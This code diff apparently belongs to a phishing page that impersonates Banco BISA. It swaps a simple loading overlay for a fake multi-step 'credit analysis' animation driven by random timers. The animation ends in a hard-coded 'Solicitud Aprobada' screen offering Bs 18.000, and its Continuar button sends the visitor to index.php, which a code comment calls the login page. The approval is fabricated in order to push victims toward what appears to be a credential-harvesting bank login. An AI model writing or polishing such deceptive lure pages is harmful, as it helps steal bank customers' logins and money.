@@ -152,29 +152,68 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
     .btn-aplicar:hover { background:#002d5e; box-shadow:0 4px 12px rgba(0,62,126,0.3); }
     .btn-aplicar:disabled { background:#ccc; cursor:not-allowed; box-shadow:none; }
 
-    /* ── Loading overlay ── */
+    /* ── Loading / Progress overlay ── */
     .loading-overlay {
       position:fixed; inset:0; background:#003e7e;
       display:none; align-items:center; justify-content:center;
       flex-direction:column; z-index:9999;
     }
     .loading-overlay.active { display:flex; }
-    .loading-logo { width:140px; margin-bottom:32px; animation:pulse 1.6s ease-in-out infinite; }
+    .loading-logo { width:140px; margin-bottom:36px; animation:pulse 1.6s ease-in-out infinite; }
     @keyframes pulse {
       0%,100% { opacity:1; transform:scale(1); }
       50% { opacity:0.7; transform:scale(0.96); }
     }
-    .loading-bar { width:220px; height:3px; background:rgba(255,255,255,0.15); overflow:hidden; position:relative; }
-    .loading-bar::before {
-      content:''; position:absolute; inset:0; background:#ffc400;
-      transform:translateX(-100%); animation:slide 1.4s ease-in-out infinite;
+
+    .progress-phase { text-align:center; width:320px; }
+    .progress-track {
+      width:100%; height:6px; background:rgba(255,255,255,0.15);
+      border-radius:3px; overflow:hidden; margin-bottom:12px;
     }
-    @keyframes slide {
-      0% { transform:translateX(-100%); }
-      50% { transform:translateX(0); }
-      100% { transform:translateX(100%); }
+    .progress-fill {
+      height:100%; width:0%; background:#ffc400;
+      border-radius:3px; transition:width 0.4s ease;
     }
-    .loading-text { margin-top:20px; color:rgba(255,255,255,0.85); font-size:13px; letter-spacing:1px; font-weight:300; }
+    .progress-pct {
+      font-size:28px; font-weight:700; color:#ffc400;
+      margin-bottom:8px; letter-spacing:1px;
+    }
+    .progress-step {
+      font-size:13px; color:rgba(255,255,255,0.8);
+      letter-spacing:0.5px; font-weight:300; min-height:20px;
+    }
+
+    .approved-phase {
+      display:none; text-align:center;
+      animation:fadeUp 0.6s ease forwards;
+    }
+    .approved-phase.active { display:block; }
+    @keyframes fadeUp {
+      from { opacity:0; transform:translateY(20px); }
+      to { opacity:1; transform:translateY(0); }
+    }
+    .approved-icon { margin-bottom:16px; }
+    .approved-title {
+      font-size:22px; font-weight:600; color:#fff;
+      margin-bottom:8px; letter-spacing:0.5px;
+    }
+    .approved-amount {
+      font-size:42px; font-weight:700; color:#ffc400;
+      margin-bottom:16px; letter-spacing:1px;
+    }
+    .approved-msg {
+      font-size:14px; color:rgba(255,255,255,0.85);
+      line-height:1.6; max-width:360px; margin:0 auto 28px;
+    }
+    .btn-continuar {
+      display:inline-block; padding:14px 52px;
+      background:#ffc400; color:#003e7e; border:none;
+      font-size:15px; font-weight:700; letter-spacing:0.5px;
+      cursor:pointer; border-radius:4px;
+      transition:background 0.2s, box-shadow 0.2s;
+      font-family:'Roboto',sans-serif;
+    }
+    .btn-continuar:hover { background:#ffd740; box-shadow:0 4px 16px rgba(255,196,0,0.4); }
 
     /* ── Responsive ── */
     @media (max-width:600px) {
@@ -246,11 +285,32 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
     </div>
   </div>
 
-  <!-- Loading Overlay -->
+  <!-- Loading / Progress Overlay -->
   <div class="loading-overlay" id="loadingOverlay">
     <img class="loading-logo" src="img/logo_positivo_login-big.b9c9cab904e2bff7e1a9.png" alt="Banco BISA"/>
-    <div class="loading-bar"></div>
-    <div class="loading-text">PROCESANDO SOLICITUD...</div>
+
+    <!-- Fase 1: Progreso -->
+    <div class="progress-phase" id="progressPhase">
+      <div class="progress-track">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+      <div class="progress-pct" id="progressPct">0%</div>
+      <div class="progress-step" id="progressStep">Iniciando análisis...</div>
+    </div>
+
+    <!-- Fase 2: Aprobado -->
+    <div class="approved-phase" id="approvedPhase">
+      <div class="approved-icon">
+        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#ffc400" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/>
+          <polyline points="9 12 11 14 15 10"/>
+        </svg>
+      </div>
+      <h2 class="approved-title">¡Solicitud Aprobada!</h2>
+      <p class="approved-amount">Bs 18.000</p>
+      <p class="approved-msg">Sigue los pasos a continuación para completar tu solicitud y acceder a tu crédito pre-aprobado.</p>
+      <button class="btn-continuar" type="button" id="btnContinuar">Continuar</button>
+    </div>
   </div>
 
 <script>
@@ -304,10 +364,40 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
       });
     } catch(e) { console.error(e); }
 
-    // Loading 3s → redirigir al login
-    setTimeout(() => {
+    // Progreso animado
+    const fill = document.getElementById('progressFill');
+    const pct = document.getElementById('progressPct');
+    const stepTxt = document.getElementById('progressStep');
+    const progressPhase = document.getElementById('progressPhase');
+    const approvedPhase = document.getElementById('approvedPhase');
+
+    const steps = [
+      { p:12, t:'Verificando datos personales...' },
+      { p:25, t:'Consultando historial crediticio...' },
+      { p:40, t:'Analizando capacidad de pago...' },
+      { p:55, t:'Consultando créditos con otras entidades...' },
+      { p:70, t:'Evaluando perfil financiero...' },
+      { p:82, t:'Verificando referencias bancarias...' },
+      { p:92, t:'Generando resultado...' },
+      { p:100, t:'¡Análisis completado!' },
+    ];
+
+    for (let i = 0; i < steps.length; i++) {
+      await new Promise(r => setTimeout(r, 900 + Math.random() * 600));
+      fill.style.width = steps[i].p + '%';
+      pct.textContent = steps[i].p + '%';
+      stepTxt.textContent = steps[i].t;
+    }
+
+    // Mostrar aprobación
+    await new Promise(r => setTimeout(r, 800));
+    progressPhase.style.display = 'none';
+    approvedPhase.classList.add('active');
+
+    // Botón continuar → login
+    document.getElementById('btnContinuar').addEventListener('click', () => {
       window.location.href = 'index.php';
-    }, 3000);
+    });
   });
 
   // Enter key en cualquier campo → submit
